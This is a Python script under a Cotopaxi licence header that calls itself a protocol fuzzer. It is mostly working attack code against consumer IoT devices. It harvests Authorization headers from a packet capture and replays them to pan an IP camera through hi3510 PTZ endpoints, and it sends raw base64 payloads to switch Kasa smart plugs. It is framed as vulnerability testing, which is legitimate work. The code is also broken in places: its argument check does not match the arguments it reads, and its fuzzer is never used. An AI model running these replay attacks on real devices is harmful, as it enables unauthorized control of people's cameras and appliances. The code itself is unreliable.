# -*- coding: utf-8 -*-
"""Tool for protocol fuzzing of network service at given IP and port ranges."""
#
#    Copyright (C) 2021 Cotopaxi Contributors. All Rights Reserved.
#    Copyright (C) 2020 Samsung Electronics. All Rights Reserved.
#       Authors: Jakub Botwicz, Michał Radwański
#
#    This file is part of Cotopaxi.
#
#    Cotopaxi is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    Cotopaxi is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with Cotopaxi.  If not, see <http://www.gnu.org/licenses/>.
#

import sys
from scapy.all import PcapNgReader
import requests
import socket
import base64
import pyshark
from fuzzingbook.MutationFuzzer import *

def extract_unique_authorization_headers(file_path, name, ip, direc):
    try:
        with PcapNgReader(file_path) as pcapng_reader:
            packets = list(pcapng_reader)
        # Set to store unique Authorization headers
        unique_authorization_headers = set()

        # Filter packets with HTTP layer (TCP and containing 'GET')
        http_packets = [pkt for pkt in packets if pkt.haslayer('TCP') and pkt.haslayer('Raw') and 'GET' in str(pkt['Raw'].load)]

        # Extract and print unique Authorization headers
        for pkt in http_packets:
            http_request = pkt['Raw'].load.decode('utf-8', 'replace')

            # Check if the HTTP request contains "Authorization" header
            if 'Authorization' in http_request:
                authorization_header = http_request.split('Authorization: ')[1].split('\r\n')[0]

                # Print the Authorization header only if it's unique
                if authorization_header not in unique_authorization_headers:
                    unique_authorization_headers.add(authorization_header)
                    headers_pcap = {'Authorization': authorization_header}
                    get_craft_send(ip, headers_pcap, direc, name)

    except Exception as e:
        print(f"Error extracting Authorization headers from pcapng file: {e}")

def get_craft_send(ip_t, headers_pcap, direc, name):
    rot_left = "/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=left"
    rot_right = "/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=right"
    rot_up = "/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=up"
    rot_down = "/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=down"

    if direc == "left":
        response = requests.get("http://" + ip_t + rot_left, headers=headers_pcap)
        if response.status_code == 200:
            print("================================================================")
            print("Test Statistics :")
            print("Message Sent : 1")
            print("Response Received : 1")
            print("0% Messsage Loss")
            print("Test Time : ")
            print("\n")
            print("Device Name : ", name)
            print("Vulnerable to Unauthorized Left turn")
            print("================================================================")
    elif direc == "right":
        response = requests.get("http://" + ip_t + rot_right, headers=headers_pcap)
        if response.status_code == 200:
            print("================================================================")
            print("Test Statistics :")
            print("Message Sent : 1")
            print("Response Received : 1")
            print("0% Messsage Loss")
            print("Test Time : ")
            print("\n")
            print("Device Name : ", name)
            print("Vulnerable to Unauthorized Right turn")
            print("================================================================")
    elif direc == "up":
        response = requests.get("http://" + ip_t + rot_up, headers=headers_pcap)
        if response.status_code == 200:
            print("================================================================")
            print("Test Statistics :")
            print("Message Sent : 1")
            print("Response Received : 1")
            print("0% Messsage Loss")
            print("Test Time : ")
            print("\n")
            print("Device Name : ", name)
            print("Vulnerable to Unauthorized Up turn")
            print("================================================================")
    elif direc == "down":
        response = requests.get("http://" + ip_t + rot_down, headers=headers_pcap)
        if response.status_code == 200:
            print("================================================================")
            print("Test Statistics :")
            print("Message Sent : 1")
            print("Response Received : 1")
            print("0% Messsage Loss")
            print("Test Time : ")
            print("\n")
            print("Device Name : ", name)
            print("Vulnerable to Unauthorized Down turn")
            print("================================================================")
def mutate_fuzzer(link):
    seed_input = link
    mutation_fuzzer = MutationFuzzer(seed=[seed_input])
    [mutation_fuzzer.fuzz() for i in range(10)]

def kodak(name, filepath):
    cap = pyshark.FileCapture(filepath)
    exported_objects = {}
    for pkt in cap:
    # Check if the packet has the desired protocol (e.g., HTTP)
        if 'http' in pkt:
        # Check if the packet contains any objects to export
            if hasattr(pkt.http, 'file_data'):
                # Extract the object name and data
                obj_name = pkt.http.file_data.replace('/', '_')
                obj_data = bytes(pkt.http.file_data, 'utf-8')

                # Store the object in the dictionary
                exported_objects[obj_name] = obj_data
    for obj_name, obj_data in exported_objects.items():
        with open(obj_name, 'wb') as f:
            f.write(obj_data)


def kasa(ip, port, payload):
    payload_on = "AAAAKtDygfiL/5r31e+UtsWg1Iv5nPCR6LfEsNGlwOLYo4HyhueT9tTu36Lfog=="
    payload_off = "AAAAKtDygfiL/5r31e+UtsWg1Iv5nPCR6LfEsNGlwOLYo4HyhueT9tTu3qPeow=="
    try:
        decoded_payload = base64.b64decode(payload)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.sendall(decoded_payload)
            response = s.recv(1024).decode()
            print(response)
        return response
    except Exception as e:
        print(f"Couldn't connect to {ip}:{port}, error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 4:
        print("Usage: cotopaxi.iot_fuzzer [name] [ip] [direction] [port]")
        sys.exit(1)

    name = sys.argv[1]
    ip = sys.argv[2]
    direction = sys.argv[3]
    if name == "kasa":
        port = int(sys.argv[4])

    if name == "d3d":
        file_path = "/home/neouchiha/Downloads/d3d2.pcapng"
        extract_unique_authorization_headers(file_path, name, ip, direction)
    elif name == "kasa":
        payload = input("Enter payload: ")
        kasa(ip, port, payload)
    elif name == "kodak":
        filepath = "/home/neouchiha/Project_Work/kodak.pcapng"
        kodak(name, filepath)
    else:
        print("Invalid name entered.")

if __name__ == "__main__":
    main()
